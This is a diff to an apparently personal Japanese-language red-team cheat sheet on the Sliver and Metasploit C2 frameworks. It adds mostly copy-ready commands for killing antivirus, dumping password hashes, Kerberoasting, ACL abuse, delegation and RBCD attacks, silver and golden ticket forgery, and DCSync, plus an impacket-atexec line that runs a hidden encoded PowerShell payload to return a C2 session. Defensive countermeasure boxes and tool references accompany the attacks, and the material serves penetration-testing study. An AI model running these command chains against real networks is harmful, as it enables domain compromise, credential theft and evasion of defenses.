+<span class="k">msf6</span> &gt; run
+
+<span class="c"># AV 無効化 / kill</span>
+<span class="k">msf6</span> &gt; use post/windows/manage/killav
+
+<span class="c"># credential / hash 収集</span>
+<span class="k">msf6</span> &gt; use post/windows/gather/hashdump
+<span class="k">msf6</span> &gt; use post/windows/gather/credentials/domain_hashdump
+
+<span class="c"># 他の post module 探索</span>
+<span class="k">msf6</span> &gt; search post/windows/manage
+<span class="k">msf6</span> &gt; search post/windows/gather</code></pre></div>
+
+      <h3>Machine 再起動</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code>execute -o shutdown -r -t 0</code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>PowerShell remoting は network logon type で走るため <code>SeShutdownPrivilege</code> を持たない。<code>shutdown</code> コマンドは interactive logon session からのみ有効。</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Tamper Protection 有効化 — Defender の各種 Set-MpPreference 変更をブロック (Windows 10 1903+)。</li>
+          <li>RDP / WinRM の GPO による強制無効化、有効化操作は EID 4739 (audit policy 変更) や service state 変更で追跡。</li>
+          <li>DisableRestrictedAdmin レジストリ変更を Sysmon EID 13 で監視 — PtH RDP を可能にする改変。</li>
+          <li>net user / net group /domain 系コマンドをすべて 4720 / 4728 で記録、workstation 上での実行は要調査。</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s13" class="reveal">
+      <h2><span class="num">13</span>Domain Attack<span class="jp">ドメイン攻撃</span></h2>
+      <p>ドメイン内の enum → 権限昇格 → 横展開 → forest 侵害までを Sliver 経由で実行するテクニック集。手法自体の詳細は <a href="ad-compromise.html">ad-compromise</a> の各セクションが本文、ここでは <em>Sliver 上での実行手段</em> に集中する。定番は SharpHound / PowerView (assembly or SharpSh 経由)、Rubeus (Kerberoast / delegation / silver / golden)、SharpKatz (DCSync)。</p>
+
+      <h3>Domain Enumeration</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerView 経由</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainComputer"'</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainComputer &lt;TARGET&gt;"'</span>
+
+<span class="c"># SharpHound (legacy + latest 両方を並行、OSEP スタイル)</span>
+cd C:/Windows/tasks
+execute-assembly -t 200 -- <span class="v">&lt;TOOL_DIR&gt;</span>/SharpHound.exe -C all --searchforest
+execute-assembly -t 200 -- <span class="v">&lt;TOOL_DIR&gt;</span>/SharpHound.exe -d <span class="v">&lt;DOMAIN&gt;</span> -C all --searchforest
+
+<span class="c"># PowerShell legacy 版</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/SharpHound.ps1 -c "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -SearchForest"'</span>
+
+<span class="c"># SharpLaps — LAPS 管理パスワード取得</span>
+sharplaps /host:<span class="v">&lt;DC&gt;</span>
+sharplaps /host:<span class="v">&lt;DC&gt;</span> /target:<span class="v">&lt;TARGET&gt;</span>
+
+<span class="c"># PingCastle — AD security audit</span>
+execute-assembly -t 200 <span class="v">&lt;TOOL_DIR&gt;</span>/PingCastle/PingCastle.exe \
+  --healthcheck --explore-trust --explore-forest-trust --level Full --no-enum-limit --skip-null-session
+
+<span class="c"># adPEAS — PowerView 相当を wrap した audit</span>
+sharpsh -t 200 -- <span class="s">'-u http://&lt;LHOST&gt;/adPEAS.ps1 -c "Invoke-adPEAS"'</span>
+
+<span class="c"># Shares 列挙 — SharpShares / Snaffler</span>
+execute-assembly -t 200 <span class="v">&lt;TOOL_DIR&gt;</span>/SharpShares.exe /ldap:all
+execute-assembly -t 200 <span class="v">&lt;TOOL_DIR&gt;</span>/Snaffler.exe -s</code></pre></div>
+
+      <h3>Trust Enumeration (PowerView)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># domain / forest trust 情報</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainTrust"'</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainTrustMapping"'</span>
+
+<span class="c"># 特定 domain の trust</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainTrust -Domain &lt;OTHER_DOMAIN&gt;"'</span>
+
+<span class="c"># foreign group member (別 forest からのメンバ)</span>
+sharpsh -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainForeignGroupMember -Domain &lt;OTHER_DOMAIN&gt;"'</span>
+
+<span class="c"># GPO による localgroup mapping</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainGPOUserLocalGroupMapping"'</span></code></pre></div>
+
+      <h3>Kerberoasting</h3>
+      <p>SPN 保有ユーザに対する TGS 要求 → hashcat mode 13100 でクラック。<code>rubeus kerberoast /simple /nowrap</code> が標準、trust 越しの roast は <code>/domain</code> 指定。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># 現ドメイン</span>
+rubeus -- kerberoast /simple /nowrap
+
+<span class="c"># trust 越し</span>
+rubeus -- kerberoast /simple /domain:<span class="v">&lt;OTHER_DOMAIN&gt;</span> /nowrap</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>hashcat -m 13100 -a 0 kerb.hashes /usr/share/wordlists/rockyou.txt -w 3 -O</code></pre></div>
+
+      <h3>ACL Abuse — ForcePasswordChange on User</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># PowerView 経由で任意 password に変更</span>
+sharpsh -t 20 -- -u http://<span class="v">&lt;LHOST&gt;</span>/PowerView.ps1 -e -c <span class="v">&lt;BASE64_SetDomainUserPassword&gt;</span>
+
+<span class="c"># 変更確認</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainUser -Identity &lt;USER&gt; | select pwdlastset"'</span></code></pre></div>
+
+      <h3>ACL Abuse — GenericWrite on User (SPN 追加 + kerberoast)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># target user に SPN を追加</span>
+sharpsh -t 20 -- -u http://<span class="v">&lt;LHOST&gt;</span>/PowerView.ps1 -e -c <span class="v">&lt;BASE64_SetDomainObject_SPN&gt;</span>
+
+<span class="c"># SPN ベースで hash 取得</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainSPNTicket -SPN pwned/service -OutputFormat Hashcat | fl"'</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>hashcat -m 13100 -a 0 user.hash /usr/share/wordlists/rockyou.txt -w 3 -O</code></pre></div>
+
+      <h3>ACL Abuse — WriteDacl on Group</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># attacker アカウントに group への WriteMembers 相当を付与</span>
+sharpsh -t 20 -- -u http://<span class="v">&lt;LHOST&gt;</span>/PowerView.ps1 -e -c <span class="v">&lt;BASE64_AddDomainObjectAcl_All&gt;</span>
+
+<span class="c"># attacker を対象 group に追加</span>
+sharpsh -t 20 -- -u http://<span class="v">&lt;LHOST&gt;</span>/PowerView.ps1 -e -c <span class="v">&lt;BASE64_AddDomainGroupMember&gt;</span>
+
+<span class="c"># メンバシップ確認</span>
+sharpsh -t 20 -- -u http://<span class="v">&lt;LHOST&gt;</span>/PowerView.ps1 -e -c <span class="v">&lt;BASE64_GetDomainGroupMember&gt;</span></code></pre></div>
+
+      <h3>ACL Abuse — Linux abuse (impacket-dacledit + pth-net)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># admins group への WriteMembers を attacker に付与</span>
+proxychains impacket-dacledit -action <span class="s">'write'</span> -rights <span class="s">'WriteMembers'</span> \
+  -principal <span class="s">'attacker'</span> -target <span class="s">'admins'</span> \
+  <span class="s">'<span class="v">&lt;DOMAIN&gt;</span>'</span>/<span class="s">'attacker'</span> -hashes <span class="s">':<span class="v">&lt;NTLM&gt;</span>'</span>
+
+<span class="c"># pth-net で group member 追加</span>
+proxychains pth-net rpc group addmem <span class="s">"admins"</span> <span class="s">"attacker"</span> \
+  -U <span class="s">"<span class="v">&lt;DOMAIN&gt;</span>"</span>/<span class="s">"attacker"</span>%<span class="s">"<span class="v">&lt;NTLM&gt;</span>:<span class="v">&lt;NTLM&gt;</span>"</span> \
+  -S <span class="s">"<span class="v">&lt;DC&gt;</span>"</span></code></pre></div>
+
+      <h3>Unconstrained Delegation</h3>
+      <p>Unconstrained delegation を持つ machine account に coerce authentication を仕掛けて TGT を回収し、任意ホストの CIFS にアクセスする。SpoolSample / SharpSpoolTrigger で coerce、rubeus monitor で TGT を待受け、抽出後に PTT する。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># unconstrained delegation 保持の computer/user 列挙</span>
+sharpsh -- -u <span class="s">'http://&lt;LHOST&gt;/PowerView.ps1'</span> -c <span class="s">'"Get-DomainComputer -UnConstrained"'</span>
+sharpsh -- -u <span class="s">'http://&lt;LHOST&gt;/PowerView.ps1'</span> -c <span class="s">'"Get-DomainUser -UnConstrained"'</span>
+
+<span class="c"># Machine account context で rubeus monitor を稼働 (別 session)</span>
+rubeus -t 30 -- monitor /interval:5 /runfor:15 /filteruser:<span class="v">&lt;DC&gt;</span>$ /nowrap
+
+<span class="c"># 別 session で coerce (SharpSpoolTrigger 推奨)</span>
+execute-assembly -t 20 <span class="v">&lt;TOOL_DIR&gt;</span>/SharpSpoolTrigger.exe <span class="v">&lt;DC&gt;</span> <span class="v">&lt;TARGET_MACHINE&gt;</span>
+
+<span class="c"># 現ticket 確認</span>
+execute -o klist
+
+<span class="c"># 取得した TGT を PTT (base64 kirbi を直接インジェクト)</span>
+rubeus -i -- ptt /ticket:<span class="v">&lt;BASE64_TGT&gt;</span>
+execute -o klist</code></pre></div>
+
+      <h3>Constrained Delegation (Machine)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># constrained delegation 保持マシン列挙</span>
+sharpsh -- -u <span class="s">'http://&lt;LHOST&gt;/PowerView.ps1'</span> -c <span class="s">'"Get-DomainComputer -TrustedToAuth"'</span>
+
+<span class="c"># S4U で任意ユーザ impersonate + 目的 SPN の ticket 取得</span>
+rubeus -t 20 -- s4u /user:<span class="v">&lt;MACHINE&gt;</span>$ /rc4:<span class="v">&lt;NTLM&gt;</span> \
+  /impersonateuser:administrator \
+  /msdsspn:<span class="s">"cifs/<span class="v">&lt;TARGET&gt;</span>"</span> /nowrap /ptt
+
+<span class="c"># altservice で複数 SPN を一括 (http/host/cifs)</span>
+rubeus -t 20 -- s4u /user:<span class="v">&lt;MACHINE&gt;</span>$ /rc4:<span class="v">&lt;NTLM&gt;</span> \
+  /impersonateuser:administrator \
+  /msdsspn:<span class="s">"cifs/<span class="v">&lt;TARGET&gt;</span>"</span> /altservice:host /nowrap /ptt
+rubeus -t 20 -- s4u /user:<span class="v">&lt;MACHINE&gt;</span>$ /rc4:<span class="v">&lt;NTLM&gt;</span> \
+  /impersonateuser:administrator \
+  /msdsspn:<span class="s">"cifs/<span class="v">&lt;TARGET&gt;</span>"</span> /altservice:cifs /nowrap /ptt
+
+<span class="c"># 別プロセスへの ticket 注入が必要なら createnetonly</span>
+rubeus -i -t 20 -- createnetonly /program:C:\\Windows\\System32\\cmd.exe /ticket:<span class="v">&lt;BASE64_TGT&gt;</span>
+migrate -p <span class="v">&lt;PID&gt;</span>
+
+execute -o klist
+ls //<span class="v">&lt;TARGET&gt;</span>/c$</code></pre></div>
+
+      <h3>Constrained Delegation (User) + Linux abuse</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># user 側 constrained delegation 列挙</span>
+sharpsh -- -u <span class="s">'http://&lt;LHOST&gt;/PowerView.ps1'</span> -c <span class="s">'"Get-DomainUser -TrustedToAuth"'</span>
+
+<span class="c"># password から NTLM を計算</span>
+rubeus -t 20 -- hash /password:<span class="v">&lt;PASSWORD&gt;</span>
+
+<span class="c"># S4U impersonation</span>
+rubeus -t 20 -- s4u /user:<span class="v">&lt;USER&gt;</span> /rc4:<span class="v">&lt;NTLM&gt;</span> \
+  /impersonateuser:administrator \
+  /msdsspn:<span class="s">"cifs/<span class="v">&lt;TARGET&gt;</span>"</span> /nowrap /ptt</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux 側 — impacket-getST で S4U ticket 取得</span>
+impacket-getST -spn cifs/<span class="v">&lt;TARGET_SHORT&gt;</span> -impersonate administrator <span class="s">'<span class="v">&lt;DOMAIN&gt;</span>/<span class="v">&lt;USER&gt;</span>:<span class="v">&lt;PASSWORD&gt;</span>'</span>
+
+<span class="c"># ccache に export</span>
+export KRB5CCNAME=administrator@cifs_<span class="v">&lt;TARGET&gt;</span>.ccache
+klist
+
+<span class="c"># FQDN を使うと SMB error になるので short name のみ</span>
+impacket-psexec -no-pass -k <span class="v">&lt;DOMAIN&gt;</span>/administrator@<span class="v">&lt;TARGET_SHORT&gt;</span> -target-ip <span class="v">&lt;TARGET_IP&gt;</span>
+
+<span class="c"># atexec で Sliver session を直接返す</span>
+impacket-atexec -k -no-pass <span class="v">&lt;DOMAIN&gt;</span>/administrator@<span class="v">&lt;TARGET_SHORT&gt;</span> \
+  <span class="s">'powershell -w hidden -enc &lt;BASE64_PAYLOAD&gt;'</span></code></pre></div>
+
+      <h3>Resource-Based Constrained Delegation (RBCD)</h3>
+      <p>GenericWrite を machine object に持てば <code>ms-DS-MachineAccountQuota</code> ≥ 1 で新規 computer account を作って RBCD を成立させ、任意 SPN の任意 user impersonate ticket を得られる。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># MachineAccountQuota 確認</span>
+sharpsh -t 20 -- -u http://<span class="v">&lt;LHOST&gt;</span>/PowerView.ps1 -e -c <span class="v">&lt;BASE64_GetDomainObject_MAQ&gt;</span>
+
+<span class="c"># PowerMad で新規 computer account 作成</span>
+sharpsh -t 20 -- -u http://<span class="v">&lt;LHOST&gt;</span>/Powermad.ps1 -e -c <span class="v">&lt;BASE64_NewMachineAccount&gt;</span>
+
+<span class="c"># 対象 machine の msds-allowedtoactonbehalfofotheridentity に SDDL を注入</span>
+sharpsh -i -t 20 -- -u http://<span class="v">&lt;LHOST&gt;</span>/PowerView.ps1 -e -c <span class="v">&lt;BASE64_RBCD_SetDescriptor&gt;</span>
+
+<span class="c"># 注入内容を確認</span>
+sharpsh -i -t 20 -- -u http://<span class="v">&lt;LHOST&gt;</span>/PowerView.ps1 -e -c <span class="v">&lt;BASE64_RBCD_Verify&gt;</span>
+
+<span class="c"># 新規 computer の NTLM 計算 + S4U ticket 取得</span>
+rubeus -t 20 -- hash /password:<span class="v">&lt;PASSWORD&gt;</span>
+rubeus -t 20 -- s4u /user:<span class="v">&lt;NEW_COMPUTER&gt;</span>$ /rc4:<span class="v">&lt;NTLM&gt;</span> \
+  /impersonateuser:administrator /msdsspn:CIFS/<span class="v">&lt;TARGET&gt;</span> /nowrap /ptt
+
+<span class="c"># CIFS 経由アクセス確認</span>
+ls //<span class="v">&lt;TARGET&gt;</span>/c$
+
+<span class="c"># psexec で shell 取得</span>
+psexec -d <span class="v">&lt;SVC_TITLE&gt;</span> -s <span class="v">&lt;SVC_DESC&gt;</span> -p svc-lateral <span class="v">&lt;TARGET&gt;</span></code></pre></div>
+
+      <h3>Silver Ticket</h3>
+      <p>service account NTLM を持てば、その service (HTTP/CIFS 等) に対する任意ユーザ impersonate ticket を forge する。DA でなくても target service にはアクセスできる。Windows は Rubeus、Linux は impacket-ticketer + firefox 設定。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># 事前 TGT 取得 (auth 補助)</span>
+rubeus -- asktgt /domain:<span class="v">&lt;DOMAIN&gt;</span> /user:<span class="v">&lt;USER&gt;</span> /rc4:<span class="v">&lt;NTLM&gt;</span> /nowrap /ptt
+
+<span class="c"># silver ticket forge — service ユーザの hash + 対象 SPN を指定</span>
+rubeus -t 30 -- silver /service:HTTP/<span class="v">&lt;TARGET&gt;</span> /rc4:<span class="v">&lt;SVC_NTLM&gt;</span> \
+  /user:<span class="v">&lt;VICTIM&gt;</span> /domain:<span class="v">&lt;DOMAIN&gt;</span> /nowrap /ldap /ptt
+
+<span class="c"># IE で trusted site 登録 → 対象 URL アクセス</span>
+execute -o iexplore http://<span class="v">&lt;TARGET&gt;</span>/Internal/Admin</code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># Linux — impacket-ticketer で silver ticket 生成</span>
+impacket-ticketer -nthash <span class="v">&lt;SVC_NTLM&gt;</span> \
+  -domain-sid <span class="v">&lt;DOMAIN_SID&gt;</span> \
+  -domain <span class="v">&lt;DOMAIN&gt;</span> \
+  -spn HTTP/<span class="v">&lt;TARGET&gt;</span> <span class="v">&lt;VICTIM&gt;</span>
+
+<span class="c"># ccache export</span>
+export KRB5CCNAME=<span class="v">&lt;VICTIM&gt;</span>.ccache
+klist
+
+<span class="c"># curl with kerberos</span>
+curl -k --negotiate -u : http://<span class="v">&lt;TARGET&gt;</span>/Internal/Admin
+
+<span class="c"># firefox は about:config で network.negotiate-auth.trusted-uris と delegation-uris を設定</span>
+firefox --new-tab http://<span class="v">&lt;TARGET&gt;</span>/Internal/Admin</code></pre></div>
+
+      <h3>Golden Ticket — Child → Parent Domain</h3>
+      <p>child domain の krbtgt hash を DCSync で取得後、parent domain SID を含む sidhistory を仕込んで forge。<code>-519</code> は Enterprise Admins RID (固定)。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># parent + child の SID を取得</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainSid -Domain &lt;CHILD_DOMAIN&gt;"'</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainSid -Domain &lt;PARENT_DOMAIN&gt;"'</span>
+
+<span class="c"># golden forge — sid=child, sids=parent_sid-519 (EA)</span>
+rubeus -t 30 -- golden /rc4:<span class="v">&lt;CHILD_KRBTGT_NTLM&gt;</span> \
+  /sid:<span class="v">&lt;CHILD_SID&gt;</span> \
+  /sids:<span class="v">&lt;PARENT_SID&gt;</span>-519 \
+  /ldap /user:Administrator /domain:<span class="v">&lt;CHILD_DOMAIN&gt;</span> /nowrap /ptt
+
+<span class="c"># parent DC アクセス確認</span>
+execute -o klist
+ls //<span class="v">&lt;PARENT_DC&gt;</span>/c$
+psexec -d <span class="v">&lt;SVC_TITLE&gt;</span> -s <span class="v">&lt;SVC_DESC&gt;</span> -p svc-lateral <span class="v">&lt;PARENT_DC&gt;</span></code></pre></div>
+
+      <h3>Golden Ticket — Parent → Child Domain</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">sliver</span><button class="copy">copy</button></div><pre><code><span class="c"># SharpKatz で parent domain の krbtgt DCSync</span>
+execute-assembly <span class="v">&lt;TOOL_DIR&gt;</span>/SharpKatz.exe --Command dcsync \
+  --User <span class="v">&lt;DOMAIN&gt;</span>\\krbtgt --Domain <span class="v">&lt;DOMAIN&gt;</span> --DomainController <span class="v">&lt;DC&gt;</span>
+
+<span class="c"># parent SID を取得</span>
+sharpsh -t 20 -- <span class="s">'-u http://&lt;LHOST&gt;/PowerView.ps1 -c "Get-DomainSid -Domain &lt;DOMAIN&gt;"'</span>
+
+<span class="c"># golden forge (sid = sids で child scope を掌握)</span>
+rubeus -t 30 -- golden /rc4:<span class="v">&lt;PARENT_KRBTGT_NTLM&gt;</span> \
+  /sid:<span class="v">&lt;PARENT_SID&gt;</span> \
+  /sids:<span class="v">&lt;PARENT_SID&gt;</span>-519 \
+  /ldap /user:Administrator /domain:<span class="v">&lt;DOMAIN&gt;</span> /nowrap /ptt
+
+execute -o klist
+ls //<span class="v">&lt;CHILD_DC&gt;</span>/c$
+psexec -d <span class="v">&lt;SVC_TITLE&gt;</span> -s <span class="v">&lt;SVC_DESC&gt;</span> -p svc-lateral <span class="v">&lt;CHILD_DC&gt;</span></code></pre></div>
+
+      <div class="note"><span class="lbl">note</span>Rubeus base64 encoded TGT (kirbi) は非常に大きい (2KB+)。Sliver console で改行を含むので手動貼り付けは危険 — file 経由か <code>-nowrap</code> 出力を clipboard コピー推奨。</div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Kerberoast 検知 — EID 4769 Kerberos TGS request で ticket encryption type=0x17 (RC4-HMAC) を全件警告 (現代環境は AES 中心)。</li>
+          <li>DCSync 検知 — <code>DS-Replication-Get-Changes*</code> 権限保有者を Domain Controllers / krbtgt / Enterprise Domain Controllers のみに限定、EID 4662 で全件監視。</li>
+          <li>Delegation — Unconstrained delegation を保持する host は "Sensitive & cannot be delegated" 属性で保護、Protected Users group メンバは delegation 対象外。</li>
+          <li>RBCD 検知 — <code>msds-allowedtoactonbehalfofotheridentity</code> 属性書き込みを EID 5136 で監視、DC でも同様。</li>
+          <li>krbtgt password を最低年 1 回 rotate (2 回 rotation) — Golden ticket の TTL 制限。</li>
         </ul>
       </div>
     </section>
 
     <section id="ref" class="reveal">
-      <h2><span class="num">07</span>References<span class="jp">参照</span></h2>
+      <h2><span class="num">14</span>References<span class="jp">出典</span></h2>
+      <p>フレームワーク公式ドキュメント、主要ツール、C2 検知に有用な原資料をまとめる。実運用ではドキュメントの更新頻度が高いため、コマンドフラグや API 変更に注意する。</p>
+
+      <h3>Sliver — 公式 / Armory</h3>
       <ul>
-        <li>Sliver — <a href="https://github.com/BishopFox/sliver" target="_blank" rel="noopener">BishopFox/sliver</a></li>
-        <li>Sliver Armory — <a href="https://github.com/sliverarmory" target="_blank" rel="noopener">sliverarmory</a></li>
-        <li>Metasploit Framework — <a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">rapid7/metasploit-framework</a></li>
-        <li>donut (position-independent shellcode from PE) — <a href="https://github.com/TheWover/donut" target="_blank" rel="noopener">TheWover/donut</a></li>
-        <li>SweetPotato — <a href="https://github.com/CCob/SweetPotato" target="_blank" rel="noopener">CCob/SweetPotato</a></li>
-        <li>SharpUp / SharpRDP / SharpSh / Stracciatella — GhostPack / SpecterOps toolchain</li>
-        <li>MITRE ATT&amp;CK — <a href="https://attack.mitre.org/tactics/TA0011/" target="_blank" rel="noopener">TA0011 Command and Control</a></li>
+        <li><a href="https://sliver.sh/">Sliver Wiki (BishopFox)</a> — command reference と implant 内部構造。</li>
+        <li><a href="https://github.com/BishopFox/sliver">github.com/BishopFox/sliver</a> — release / issue tracker。</li>
+        <li><a href="https://github.com/sliverarmory">github.com/sliverarmory</a> — armory alias / extension のソース。</li>
       </ul>
 
-      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+      <h3>Metasploit</h3>
+      <ul>
+        <li><a href="https://docs.metasploit.com/">docs.metasploit.com</a> — module 検索と usage。</li>
+        <li><a href="https://github.com/rapid7/metasploit-framework">github.com/rapid7/metasploit-framework</a> — module ソース。</li>
+        <li><a href="https://www.offsec.com/metasploit-unleashed/">Metasploit Unleashed (Offensive Security)</a> — 体系的入門。</li>
+      </ul>
+
+      <h3>主要ツール</h3>
+      <ul>
+        <li><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a> — Windows credential 取得の標準。</li>
+        <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a> — Kerberos 全般 (asktgt / roast / s4u / golden / silver)。</li>
+        <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> — AD 列挙 + ACL 操作。</li>
+        <li><a href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a> / <a href="https://github.com/SpecterOps/BloodHound-Legacy">BloodHound Legacy</a> — AD グラフ収集。</li>
+        <li><a href="https://github.com/Flangvik/SharpCollection">SharpCollection</a> — pre-compiled C# offensive tools。</li>
+        <li><a href="https://github.com/nicoshoss/PEzor">PEzor</a> — PE から .NET assembly / donut shellcode への変換。</li>
+        <li><a href="https://github.com/thewhiteninja/nitrogen">Nitrogen</a> — Sliver + Cobalt shellcode encoder。</li>
+        <li><a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a> — 高性能 L3 tunneling proxy。</li>
+        <li><a href="https://github.com/Pennyw0rth/NetExec">NetExec (nxc)</a> — CrackMapExec の後継、SMB/WinRM/LDAP/MSSQL spraying。</li>
+      </ul>
+
+      <h3>Armory Alias 一覧 (実運用でよく使うもの)</h3>
+      <p>Sliver armory から <code>armory install &lt;name&gt;</code> で導入するもの。<code>armory install all</code> で全部入る。</p>
+      <ul>
+        <li><code>sharpsh</code> — AMSI-clean な子 PowerShell で任意コマンド / URL script 実行。</li>
+        <li><code>stracciatella</code> — unmanaged PowerShell runspace 実行。</li>
+        <li><code>rubeus</code> — Kerberos 操作の全部入り。</li>
+        <li><code>sharpup</code> — Windows privesc auditor。</li>
+        <li><code>seatbelt</code> — situational awareness / host recon。</li>
+        <li><code>sa-whoami</code> — BOF 版の <code>whoami /all</code> 相当 (プロセス spawn なし)。</li>
+        <li><code>sharplaps</code> — LAPS 管理パスワード取得。</li>
+        <li><code>sharpview</code> — PowerView の C# port。</li>
+        <li><code>mimikatz</code> — armory 管理下の mimikatz shellcode runner。</li>
+      </ul>
+
+      <div class="takeaway"><span class="lbl">要点 / framework 比較</span>
         <ul>
-          <li>Sliver excels at evasion (BOFs, execute-assembly, hollow); Metasploit excels at rapid staging and vast module library.</li>
-          <li>Same shellcode from <code>msfvenom</code> can feed either framework — XOR encoding gains AV-signature evasion regardless of downstream C2.</li>
-          <li>Always migrate/hollow before running noisy tools; never mix operator and target credentials in the same process.</li>
-          <li>Sliver's <code>jump-*</code> lateral commands need pre-established token context; MSF's psexec accepts hashes for pure Pass-the-Hash flow.</li>
+          <li><strong>Sliver</strong> は evasion / obfuscation を framework 側で標準装備 (armory の各種 alias が AMSI/CLM/AppLocker を回避する execution primitive を提供)。engagement が長期・stealth 重視ならこちら。</li>
+          <li><strong>Metasploit</strong> は module 数と post-exploitation の網羅性で強い。session 死活の自動化 (persistence, autoroute, socks_proxy) が完成品として存在するのが利点。cross-framework fallback の shellcode ソースとしても常用。</li>
+          <li>両者を同一 engagement で併用する場合、Sliver を primary、MSF を「Sliver で詰まったときの fallback」に位置付けるのが実務的。</li>
+          <li>操作痕跡は両者とも publicly indexed — evasion sheet の技術群 (AMSI patch, ETW patch, PPID spoof, unhooking) と組み合わせて初めて EDR 環境で通る。</li>
         </ul>
       </div>
     </section>
@@ -621,15 +1453,14 @@ sharprdp -- computername=<span class="v">&lt;TARGET&gt;</span> password=<span cl
 </div>
 </main>
 
-<footer class="foot">
+<footer class="site-footer">
   <div class="wrap">
-    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · Command &amp; Control</span></div>
-    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
-    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+    <div class="foot-brand">[<b data-handle>d0me</b>] / offsec &amp; red-team notes</div>
+    <div class="foot-links"><a href="../index.html">索引</a><a href="../../about/">about</a><a href="#" data-gh-url>github</a></div>
   </div>
 </footer>
 
-<script src="../content.js"></script>
+<script src="../app.js"></script>
 <script src="../assets/js/sheet.js"></script>
 </body>
 </html>
